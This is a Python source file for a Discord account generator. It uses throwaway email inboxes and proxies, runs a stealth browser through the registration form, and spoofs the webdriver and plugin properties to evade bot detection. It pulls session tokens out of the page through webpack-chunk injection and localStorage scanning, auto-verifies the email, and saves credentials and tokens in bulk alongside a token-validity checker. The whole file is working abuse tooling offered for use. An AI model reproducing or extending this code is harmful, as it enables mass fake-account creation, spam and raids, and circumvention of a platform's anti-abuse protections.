import os
import sys
import json
import time
import random
import string
import shutil
import socket
import tempfile
import asyncio
import threading
import multiprocessing
import ctypes
import requests

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore:
        MAGENTA = WHITE = CYAN = RED = GREEN = YELLOW = RESET = BRIGHT = ""
    class Style:
        RESET_ALL = BRIGHT = ""

try:
    import zendriver as uc
except ImportError:
    print(f"[!] zendriver not installed!")
    sys.exit(1)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

sys.path.insert(0, os.path.join(BASE_DIR, "src"))
try:
    from config_loader import load_config
    from email_clients import get_email_client, CyberTempClient, SutemeadoClient
    from proxy_handler import pop_proxy
    from name_utils import get_random_identity
    from avatar_utils import get_random_avatar
    from token_utils import save_token, count_tokens_file, mask_token
    from email_utils import extract_verification_link, resolve_tracking_link, extract_verify_token, discord_verify_api
    from browser_actions import visual_click, select_month, select_day, select_year
except ImportError as e:
    print(f"[!] src ディレクトリ内のモジュールを読み込めません: {e}")

def generate_password():
    return ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%", k=16))

def generate_random_username():
    length = random.randint(8, 16)
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def get_name_from_file():
    names_file = os.path.join(BASE_DIR, "names.txt")
    if not os.path.exists(names_file):
        with open(names_file, 'w', encoding='utf-8') as f:
            pass
        return None

    with open(names_file, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]

    if not lines:
        return None

    chosen_name = lines[0]
    with open(names_file, 'w', encoding='utf-8') as f:
        for line in lines[1:]:
            f.write(line + '\n')
            
    return chosen_name

class TunnelProxy:
    def __init__(self, proxy_url):
        self.proxy_url = proxy_url
        self.port = 0
        self.server = None
        self.running = False

    def _parse(self):
        url = self.proxy_url
        if "://" in url:
            url = url.split("://", 1)[1]
        if "@" in url:
            auth, host_port = url.rsplit("@", 1)
            user, pwd = auth.split(":", 1)
        else:
            user, pwd, host_port = None, None, url
        if ":" in host_port:
            host, port = host_port.rsplit(":", 1)
        else:
            host, port = host_port, 8080
        return host, int(port), user, pwd

    def _forward(self, src, dst):
        try:
            while True:
                data = src.recv(8192)
                if not data:
                    break
                dst.sendall(data)
        except:
            pass
        try: src.close()
        except: pass
        try: dst.close()
        except: pass

    def _tunnel(self, client, remote):
        t1 = threading.Thread(target=self._forward, args=(client, remote), daemon=True)
        t2 = threading.Thread(target=self._forward, args=(remote, client), daemon=True)
        t1.start()
        t2.start()
        t1.join(timeout=120)

    def _handle(self, client):
        host, port, user, pwd = self._parse()
        auth_header = ""
        if user and pwd:
            import base64
            cred = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            auth_header = f"Proxy-Authorization: Basic {cred}\r\n"
        try:
            data = client.recv(8192)
            if not data:
                client.close()
                return
            lines = data.decode(errors="ignore").split("\r\n")
            first = lines[0] if lines else ""
            if first.startswith("CONNECT"):
                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote.settimeout(15)
                remote.connect((host, port))
                remote.sendall(data)
                resp = remote.recv(4096)
                if b"407" in resp and auth_header:
                    remote.close()
                    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    remote.settimeout(15)
                    remote.connect((host, port))
                    authed = data.replace(b"\r\n\r\n", f"\r\n{auth_header}\r\n".encode())
                    remote.sendall(authed)
                    resp = remote.recv(4092)
                if b"200" in resp:
                    client.sendall(resp)
                    self._tunnel(client, remote)
                else:
                    client.sendall(resp)
                    client.close()
            else:
                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote.settimeout(15)
                remote.connect((host, port))
                if auth_header:
                    data = data.replace(b"\r\n\r\n", f"\r\n{auth_header}\r\n".encode())
                remote.sendall(data)
                self._tunnel(client, remote)
        except Exception:
            try: client.close()
            except: pass

    def _serve(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.settimeout(1)
        self.server.bind(("127.0.0.1", 0))
        self.server.listen(50)
        _, self.port = self.server.getsockname()
        self.running = True
        while self.running:
            try:
                client, _ = self.server.accept()
                threading.Thread(target=self._handle, args=(client,), daemon=True).start()
            except socket.timeout:
                continue
            except:
                break

    def start(self):
        threading.Thread(target=self._serve, daemon=True).start()
        time.sleep(0.3)
        return f"http://127.0.0.1:{self.port}"

    def stop(self):
        self.running = False
        try: self.server.close()
        except: pass

os.makedirs(os.path.join(BASE_DIR, "config"), exist_ok=True)
months = ["January", "February", "March", "April", "May", "June",
          "July", "August", "September", "October", "November", "December"]

async def extract_token(tab):
    try:
        token = await tab.evaluate("""(() => {
            try {
                if (typeof webpackChunkdiscord_app !== 'undefined') {
                    var m = [];
                    webpackChunkdiscord_app.push([[''],{},function(e){for(var c in e.c) m.push(e.c[c]);}]);
                    for (var i = 0; i < m.length; i++) {
                        try {
                            var exp = m[i];
                            if (!exp || !exp.exports) continue;
                            if (exp.exports.default && typeof exp.exports.default.getToken === 'function') {
                                var t = exp.exports.default.getToken();
                                if (t) return t;
                            }
                            if (typeof exp.exports.getToken === 'function') {
                                var t = exp.exports.getToken();
                                if (t) return t;
                            }
                            if (exp.exports.Z && typeof exp.exports.Z.getState === 'function') {
                                try {
                                    var state = exp.exports.Z.getState();
                                    if (state && state.token) return state.token;
                                    if (state && state.users && state.users.currentUser && state.users.currentUser.token) return state.users.currentUser.token;
                                } catch(e) {}
                            }
                        } catch(e) {}
                    }
                }
            } catch(e) {}
            try {
                var t = localStorage.getItem('token');
                if (t) {
                    t = t.replace(/^"|"$/g, '');
                    if (t.length > 50) return t;
                }
            } catch(e) {}
            try {
                for (var i = 0; i < localStorage.length; i++) {
                    var key = localStorage.key(i);
                    var val = localStorage.getItem(key);
                    if (val && val.length > 50 && val.length < 500) {
                        var clean = val.replace(/^"|"$/g, '');
                        if (/^[A-Za-z0-9_-]{20,}\\.[A-Za-z0-9_-]{20,}/.test(clean)) {
                            return clean;
                        }
                    }
                }
            } catch(e) {}
            return null;
        })()""")
        if token and isinstance(token, str) and len(token) > 30:
            return token
    except:
        pass
    return None

async def check_verify_page(tab):
    try:
        text = await tab.evaluate("document.body ? document.body.innerText.toLowerCase() : ''")
        return any(ind in text for ind in ["email verified", "verification complete", "successfully verified"])
    except:
        return False

async def set_avatar_via_browser(tab, token, avatar_path):
    if not tab or not avatar_path or not os.path.exists(avatar_path):
        return False
    try:
        with open(avatar_path, 'rb') as f:
            img_data = f.read()
        img_size = len(img_data)
        if img_size > 8 * 1024 * 1024:
            return False
        ext = os.path.splitext(avatar_path)[1].lower()
        mime_map = {'.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.png': 'image/png', '.gif': 'image/gif', '.webp': 'image/webp'}
        mime_type = mime_map.get(ext, 'image/jpeg')
        import base64
        b64 = base64.b64encode(img_data).decode('utf-8')
        avatar_data = f"data:{mime_type};base64,{b64}"
    except:
        return False
    await asyncio.sleep(random.uniform(1.5, 3.0))
    avatar_js_safe = avatar_data.replace('\\', '\\\\').replace("'", "\\'").replace('\n', '').replace('\r', '')
    js = f"""(() => {{
        const avatarData = '{avatar_js_safe}';
        let authToken = null;
        try {{
            let stored = localStorage.getItem('token');
            if (stored) {{
                authToken = stored.replace(/^"|"$/g, '');
            }}
            if (!authToken || authToken.length < 30) {{
                for (let i = 0; i < localStorage.length; i++) {{
                    const key = localStorage.key(i);
                    const val = localStorage.getItem(key);
                    if (val && val.length > 50 && val.length < 500) {{
                        const clean = val.replace(/^"|"$/g, '');
                        if (/^[A-Za-z0-9_-]{{20,}}\\.[A-Za-z0-9_-]{{20,}}/.test(clean)) {{
                            authToken = clean;
                            break;
                        }}
                    }}
                }}
            }}
        }} catch(e) {{}}
        if (!authToken) {{
            try {{
                if (typeof webpackChunkdiscord_app !== 'undefined') {{
                    var m = [];
                    webpackChunkdiscord_app.push([[''],{{}},function(e){{for(var c in e.c) m.push(e.c[c]);}}]);
                    for (var i = 0; i < m.length; i++) {{
                        try {{
                            var exp = m[i];
                            if (!exp || !exp.exports) continue;
                            if (exp.exports.default && typeof exp.exports.default.getToken === 'function') {{
                                var t = exp.exports.default.getToken();
                                if (t) authToken = t;
                            }}
                            if (typeof exp.exports.getToken === 'function') {{
                                var t = exp.exports.getToken();
                                if (t) authToken = t;
                            }}
                            if (authToken) break;
                        }} catch(e) {{}}
                    }}
                }}
            }} catch(e) {{}}
        }}
        if (!authToken) {{
            return {{ status: 0, error: 'No auth token found' }};
        }}
        try {{
            const xhr = new XMLHttpRequest();
            xhr.open('PATCH', 'https://discord.com/api/v9/users/@me', false);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.setRequestHeader('Authorization', authToken);
            xhr.setRequestHeader('X-Discord-Locale', 'en-US');
            xhr.send(JSON.stringify({{ avatar: avatarData }}));
            if (xhr.status === 200 || xhr.status === 204) {{
                return {{ status: xhr.status, success: true }};
            }}
            try {{
                const data = JSON.parse(xhr.responseText);
                return {{ status: xhr.status, data: data }};
            }} catch(e) {{
                return {{ status: xhr.status, text: xhr.responseText.substring(0, 200) }};
            }}
        }} catch (e) {{
            return {{ status: 0, error: e.message }};
        }}
    }})()"""
    try:
        result = await tab.evaluate(js)
        if result and (result.get('status') == 200 or result.get('status') == 204 or result.get('success')):
            return True
        if result and result.get('status') == 429:
            retry_after = result.get('data', {}).get('retry_after', 5)
            await asyncio.sleep(retry_after + random.uniform(0.5, 1.5))
            result = await tab.evaluate(js)
            if result and (result.get('status') == 200 or result.get('status') == 204):
                return True
        return False
    except:
        return False
def validate_email(email, password, mail_client):
    if not email or not password:
        return False
    try:
        for _ in range(3):
            emails = mail_client.get_emails(email, password, wait=False, timeout=5)
            if emails is not None:
                return True
            time.sleep(2)
        return True
    except:
        return True

async def generate_single_token(config, output_file, status_callback=None):
    browser_settings = config.get("browser", {})
    proxy_settings = config.get("proxies", {})
    headless = browser_settings.get("headless", False)
    proxies_enabled = proxy_settings.get("enabled", False)
    proxy_file = proxy_settings.get("file_path", "proxies.txt")
    proxy_url = pop_proxy(proxy_file, validate=False) if proxies_enabled else None
    
    if status_callback:
        status_callback("INFO", "Creating mailbox...")
    
    mail_client = get_email_client(config)
    if not mail_client:
        return None
    
    email = None
    mail_pwd = None
    
    for attempt in range(5):
        mail_result = mail_client.create_and_track()
        if mail_result:
            email = mail_result.get("email")
            mail_pwd = mail_result.get("password", "N/A")
            
            if email and validate_email(email, mail_pwd, mail_client):
                break
            
            email = None
            mail_pwd = None
            await asyncio.sleep(2)
    
    if not email:
        return None
    
    if status_callback:
        status_callback("MAIL", f"Mail: {email}")
    
    custom_name = get_name_from_file()
    if custom_name:
        display_name = custom_name
        if status_callback:
            status_callback("NAME", f"Using custom name: {display_name}")
    else:
        display_name = generate_random_username()
        
    username = generate_random_username()
    
    profile_dir = tempfile.mkdtemp(prefix="coldgen_")
    proxy_ext_dir = None
    tunnel_proxy = None
    driver = None
    token = None
    password = generate_password()

    if status_callback:
        status_callback("PASS", f"Pass: {password}")

    try:
        if status_callback:
            status_callback("BROWSER", "Opening browser...")
        
        browser_config = uc.Config(
            headless=headless,
            user_data_dir=profile_dir,
            sandbox=False
        )
        if proxy_url:
            tunnel_proxy = TunnelProxy(proxy_url)
            local_url = tunnel_proxy.start()
            browser_config.add_argument(f"--proxy-server={local_url}")
        driver = await uc.start(config=browser_config)
        tab = await driver.get("https://discord.com/register")
        await tab.wait_for_ready_state('complete', timeout=30 if not proxies_enabled else 60)
        await asyncio.sleep(2)
        try:
            await tab.evaluate("""(() => {
                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
                Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
                window.chrome = {runtime: {}};
                delete navigator.__proto__.webdriver;
            })()""")
        except:
            pass
        await asyncio.sleep(1)
        
        if status_callback:
            status_callback("FORM", "Filling form...")
        
        try:
            el = await tab.select('input[name="email"]')
            await el.send_keys(email)
        except:
            return None
        try:
            el = await tab.select('input[name="global_name"]')
            await el.send_keys(display_name)
        except:
            pass
        try:
            el = await tab.select('input[name="username"]')
            await el.send_keys(username)
        except:
            return None
        try:
            el = await tab.select('input[name="password"]')
            await el.send_keys(password)
        except:
            return None
        
        month = random.choice(months)
        await select_month(tab, month)
        day = str(random.randint(1, 28))
        await select_day(tab, day)
        year = str(random.randint(1995, 2005))
        await select_year(tab, year)
        
        await asyncio.sleep(0.1)
        try:
            await tab.evaluate("""(() => {
                let clicked = 0;
                const sels = [
                    '[role="checkbox"]',
                    'div[class*="checkbox"]',
                    'div[class*="Checkbox"]',
                    'input[type="checkbox"]',
                    'div[class*="consent"] div[class*="box"]',
                    'div[class*="label"]'
                ];
                const seen = new Set();
                for (const sel of sels) {
                    document.querySelectorAll(sel).forEach(el => {
                        let target = el;
                        while (target && target.tagName === 'DIV' && target.querySelector('svg') && !target.getAttribute('role') && !target.getAttribute('aria-checked')) {
                            target = target.parentElement;
                        }
                        if (target && !seen.has(target) && target.offsetParent !== null) {
                            seen.add(target);
                            target.scrollIntoView();
                            target.click();
                            clicked++;
                        }
                    });
                    if (clicked > 0) break;
                }
                return clicked;
            })()""")
        except:
            pass
        await asyncio.sleep(0.15)
        try:
            await tab.evaluate("""(() => {
                let n = 0;
                document.querySelectorAll('[role="checkbox"]').forEach(cb => {
                    if (cb.getAttribute('aria-checked') !== 'true') {
                        cb.scrollIntoView();
                        cb.click();
                        n++;
                    }
                });
                return n;
            })()""")
        except:
            pass
        await asyncio.sleep(0.1)
        
        if status_callback:
            status_callback("FORM", "Form submitted!")
        
        _register_response = {"token": None, "status": None, "body": None, "url": None}

        async def _on_response(event):
            try:
                url = str(event.response.url) if event.response else ""
                if "/register" not in url and "/auth/register" not in url:
                    return
                req_id = event.request_id
                try:
                    body_result = await tab.send(uc.cdp.network.get_response_body(req_id))
                    if body_result:
                        body_text = body_result[0] if isinstance(body_result, tuple) else str(body_result)
                        _register_response["body"] = body_text
                        _register_response["url"] = url
                        _register_response["status"] = event.response.status
                        try:
                            j = json.loads(body_text)
                            if "token" in j:
                                _register_response["token"] = j["token"]
                        except:
                            pass
                except:
                    pass
            except:
                pass

        try:
            await tab.send(uc.cdp.network.enable())
            tab.add_handler(uc.cdp.network.ResponseReceived, _on_response)
        except:
            pass

        try:
            sub_el = await tab.select('button[type="submit"]')
            await visual_click(tab, sub_el)
        except:
            return None

        await asyncio.sleep(3)

        for wait_i in range(60):
            if _register_response["status"] is not None:
                break
            await asyncio.sleep(0.5)

        if _register_response["status"] is not None:
            status = _register_response["status"]
            body = _register_response["body"] or ""
            if status == 429:
                try:
                    j = json.loads(body)
                    retry_after = j.get("retry_after", 5)
                    await asyncio.sleep(retry_after + 1)
                    try:
                        sub_el = await tab.select('button[type="submit"]')
                        await visual_click(tab, sub_el)
                    except:
                        pass
                    _register_response["status"] = None
                    _register_response["token"] = None
                    for wait_i in range(30):
                        if _register_response["status"] is not None:
                            break
                        await asyncio.sleep(0.5)
                except:
                    pass

        if _register_response["token"]:
            token = _register_response["token"]

        if not token:
            try:
                rl = await tab.evaluate("""(() => {
                    return document.body.innerText.toLowerCase().includes("rate limited");
                })()""")
                if rl:
                    return None
            except:
                pass

        if status_callback:
            status_callback("CAPTCHA", "Waiting for captcha...")
        
        captcha_solved = False
        for i in range(300):
            try:
                url = tab.url
                if "/app" in url or "@me" in url or "/channels" in url:
                    captcha_solved = True
                    if status_callback:
                        status_callback("CAPTCHA", "Captcha solved! Redirected to Discord.")
                    break
                if "/verify" in url:
                    captcha_solved = True
                    if status_callback:
                        status_callback("CAPTCHA", "Captcha solved! Redirected to Discord.")
                    break
                page_text = await tab.evaluate("document.body.innerText.toLowerCase()")
                if "phone" in page_text and "verify" in page_text:
                    return None
            except:
                pass
            await asyncio.sleep(0.5)

        if not captcha_solved:
            return None

        if not token:
            for attempt in range(45):
                if _register_response["token"]:
                    token = _register_response["token"]
                    break
                token = await extract_token(tab)
                if token:
                    break
                try:
                    stored = await tab.evaluate("""(() => {
                        for (let i = 0; i < localStorage.length; i++) {
                            const key = localStorage.key(i);
                            const val = localStorage.getItem(key);
                            if (val && val.length > 50) {
                                const clean = val.replace(/^"|"$/g, '');
                                if (/^[A-Za-z0-9_-]{20,}\\.[A-Za-z0-9_-]{20,}/.test(clean)) {
                                    return clean;
                                }
                            }
                        }
                        return null;
                    })()""")
                    if stored:
                        token = stored
                        break
                except:
                    pass
                await asyncio.sleep(1)

        if not token:
            return None

        if status_callback:
            status_callback("MAIL", "Waiting for verification email...")

        emails_found = None
        wait_times = [120, 180, 240, 300]
        for email_attempt in range(4):
            wait_time = wait_times[email_attempt]
            print(f"    [Email Wait] Attempt {email_attempt+1}/4 - waiting up to {wait_time}s for Discord verification email...")
            try:
                emails_found = mail_client.get_emails(email, mail_pwd, wait=True, timeout=wait_time)
            except Exception as e:
                print(f"    [Email Wait] Error during get_emails: {e}")
                pass
            if emails_found:
                print(f"    [Email Wait] Found {len(emails_found)} email(s)!")
                break
            print(f"    [Email Wait] No emails yet, retrying...")
            await asyncio.sleep(5)

        if not emails_found:
            save_token(email, password, token, output_file)
            return None

        verify_link = None
        for em in emails_found:
            subj = em.get("subject", "").lower()
            if "verify" in subj or "discord" in subj or "email" in subj:
                verify_link = extract_verification_link(em.get("body", ""))
                if verify_link:
                    break

        if not verify_link:
            save_token(email, password, token, output_file)
            return None

        if status_callback:
            status_callback("MAIL", "Verification link found!")

        resolved = verify_link
        if "click.discord.com" in verify_link:
            resolved = resolve_tracking_link(verify_link, proxy_url)

        vtoken = extract_verify_token(resolved) or extract_verify_token(verify_link)

        if status_callback:
            status_callback("MAIL", "Verifying email...")

        verified = False
        if vtoken:
            verified = discord_verify_api(vtoken, token, proxy_url)

        if not verified:
            try:
                await driver.get(resolved)
                await asyncio.sleep(2)
                for i in range(90):
                    if await check_verify_page(tab):
                        verified = True
                        break
                    await asyncio.sleep(2)
            except:
                pass

        if verified:
            if status_callback:
                status_callback("MAIL", "Email verified!")
            save_token(email, password, token, output_file)
            avatar = get_random_avatar()
            if avatar:
                await set_avatar_via_browser(tab, token, avatar)
            if isinstance(mail_client, (CyberTempClient, SutemeadoClient)):
                try:
                    mail_client.delete_inbox(email)
                except:
                    pass
            return token
        else:
            save_token(email, password, token, output_file)
            return None

    except:
        if token:
            save_token(email, password, token, output_file)
        return None
    finally:
        try:
            if driver:
                await driver.stop()
        except:
            pass
        try:
            shutil.rmtree(profile_dir, ignore_errors=True)
        except:
            pass
        if proxy_ext_dir:
            try:
                shutil.rmtree(proxy_ext_dir, ignore_errors=True)
            except:
                pass
        if tunnel_proxy:
            try:
                tunnel_proxy.stop()
            except:
                pass

def run_single_task(config, output_file, result_queue, status_callback=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(
            generate_single_token(config, output_file, status_callback)
        )
        result_queue.put({"token": result})
    except:
        result_queue.put({"token": None})
    finally:
        loop.close()

def check_token(token):
    try:
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
        return response.status_code == 200
    except:
        return False

def check_tokens_from_file(file_path):
    if not os.path.exists(file_path):
        print(f"\n{Fore.RED}[!]{Fore.WHITE} File {file_path} not found!")
        return
    
    valid_tokens = []
    invalid_tokens = []
    
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        parts = line.split(':')
        if len(parts) >= 3:
            token = parts[2]
        else:
            token = line
        
        if check_token(token):
            print(f"{Fore.GREEN}[VALID]{Fore.WHITE} {token}")
            valid_tokens.append(line)
        else:
            print(f"{Fore.RED}[INVALID]{Fore.WHITE} {token}")
            invalid_tokens.append(line)
    
    valid_file = os.path.join(BASE_DIR, "valid.txt")
    invalid_file = os.path.join(BASE_DIR, "invalid.txt")
    
    with open(valid_file, 'w', encoding='utf-8') as f:
        for item in valid_tokens:
            f.write(item + '\n')
    
    with open(invalid_file, 'w', encoding='utf-8') as f:
        for item in invalid_tokens:
            f.write(item + '\n')
            
    print(f"\n[+] Check finished. Valid: {len(valid_tokens)} | Invalid: {len(invalid_tokens)}")

def print_menu():
    print(f"""
{Fore.RED}[1]{Fore.WHITE} Generate Accounts
{Fore.RED}[2]{Fore.WHITE} Check Tokens
{Fore.RED}[3]{Fore.WHITE} Exit
""")

def status_printer(status, message):
    timestamp = time.strftime("%H:%M:%S")
    if status == "VALID":
        print(f"{Fore.RED}[{timestamp}]{Fore.WHITE} {Fore.GREEN}[{status}]{Fore.WHITE} {message}")
    elif status == "INVALID":
        print(f"{Fore.RED}[{timestamp}]{Fore.WHITE} {Fore.RED}[{status}]{Fore.WHITE} {message}")
    else:
        print(f"{Fore.RED}[{timestamp}]{Fore.WHITE} {Fore.CYAN}[{status}]{Fore.WHITE} {message}")

# --- 補完された main 関数 ---
def main():
    multiprocessing.freeze_support()
    
    # 既存のconfigをロード、または初期値
    config = load_config()
    output_file = os.path.join(BASE_DIR, "tokens.txt")
    
    while True:
        print_menu()
        choice = input("Choice: ").strip()
        
        if choice == "1":
            try:
                count_str = input("Accounts? (1): ").strip()
                count = int(count_str) if count_str else 1
            except ValueError:
                count = 1
                
            print(f"\n[+] Starting generation for {count} account(s)...\n")
            
            # シングルまたはマルチプロセスで回す簡易実装
            for i in range(count):
                print(f"--- Generating Account {i+1}/{count} ---")
                q = multiprocessing.Queue()
                # 別プロセスまたは別スレッドで実行 (ここではデバッグしやすいよう同じスレッドか簡易Threadで処理)
                # zendriver/asyncioの競合を防ぐため別プロセスで回すのが理想的
                p = multiprocessing.Process(target=run_single_task, args=(config, output_file, q, status_printer))
                p.start()
                p.join()
                
                res = q.get() if not q.empty() else None
                if res and res.get("token"):
                    print(f"{Fore.GREEN}[SUCCESS]{Fore.WHITE} Generated Token: {mask_token(res['token'])}")
                else:
                    print(f"{Fore.RED}[FAILURE]{Fore.WHITE} Failed to generate account.")
                    
        elif choice == "2":
            file_to_check = input(f"Token file path? (tokens.txt): ").strip()
            if not file_to_check:
                file_to_check = output_file
            print(f"\n[+] Checking tokens in {file_to_check}...\n")
            check_tokens_from_file(file_to_check)
            
        elif choice == "3":
            print("[+] Exiting... Goodbye!")
            break
        else:
            print("[!] Invalid choice. Please try again.")

if __name__ == "__main__":
    main()